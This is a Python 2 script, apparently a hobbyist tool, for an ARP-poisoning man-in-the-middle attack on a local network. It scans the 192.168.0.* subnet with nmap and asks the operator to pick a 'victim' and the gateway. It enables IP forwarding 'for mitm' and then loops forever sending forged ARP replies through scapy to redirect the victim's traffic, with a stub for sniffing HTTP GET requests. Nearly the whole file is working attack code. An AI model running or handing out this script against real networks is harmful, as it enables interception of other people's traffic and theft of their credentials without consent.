#define class that is ARP, so each local host on the network is added as an object
#also compare it to existing list (array?) of obects



import nmap
import json
import os
from scapy.all import *
import time

listofhosts = []
class ARPhost():

    def __init__(self, name, mac, ip, number):
#        ARPhost.__init__(self, name, ip, mac, number)
        self.name = name
        self.ip = ip
        self.mac = mac
        self.number = number
#    def mac(self, mac):


nm = nmap.PortScanner()

host = '192.168.0.*'
results = nm.scan(hosts=host, arguments='-sP')


tobeparsed = results["scan"]


##all the below is jjust debugging
number = 0
for host in nm.all_hosts():
    number = number + 1
#    print "host status reason"
#    print tobeparsed[host]["status"]["reason"]
#    print tobeparsed[host]
#    print tobeparsed[host]["hostnames"]
    try:
#        print "name "
#        print tobeparsed[host]["hostnames"][0]["name"]
        name = tobeparsed[host]["hostnames"][0]["name"]
    except:
        pass
  #      print "host name fetching failed"
    try:
  #      print "mac address"
   #     print tobeparsed[host]["addresses"]["mac"]
        mac = tobeparsed[host]["addresses"]["mac"]
    except:
    #    print "mac fetching failed"
        pass
    #print tobeparsed[host]["addresses"]["ipv4"]
    ip = tobeparsed[host]["addresses"]["ipv4"]
    host = ARPhost(name, mac, ip, number)
    listofhosts.append(host)

for host in listofhosts:
    print str(host.number) + ":"
    print "MAC:" + str(host.mac)
    print "IP: " + str(host.ip)
    print "Name:" + str(host.name)


try:
#        interface = raw_input("[*] Enter Desired Interface: ")
        interface = "wlan0"
        victimnumber = raw_input(" Enter Victim Number: ")
        gatewaynumber = raw_input(" Enter Gateway Number: ")
except:
    print "input failed"
    pass


for host in listofhosts:
    if str(host.number) == str(victimnumber):
        victimip = host.ip
        victimmac = host.mac
    elif str(host.number) == str(gatewaynumber):
        gatewayip = host.ip
        gatewaymac = host.mac
    else:
        pass

#enabling ip forwarding for mitm
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
print "poisoning :)"
print gatewayip


def http_header(packet):
        http_packet=str(packet)
        if http_packet.find('GET'):
                return GET_print(packet)

def get_mac(IP):
        ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), verbose=0, timeout = 2, iface = interface, inter = 0.1)
        for snd,rcv in ans:
                return rcv.sprintf(r"%Ether.src%")

def arpspoof(gatewaymac, victimmac):
    send(ARP(op = 2, pdst = victimip, psrc = gatewayip, hwdst= victimmac), verbose=0)
    send(ARP(op = 2, pdst = gatewayip, psrc = victimip, hwdst= gatewaymac), verbose=0)

while True:
    try:
        gatewaymac = get_mac(gatewayip)
        victimmacmac = get_mac(victimip)
        arpspoof(gatewaymac, victimmac)

        time.sleep(0.25)

    except:
        print "poisoning failed"
        break


#    print nm[host].addresses()
#    print nm[host].hostnames()

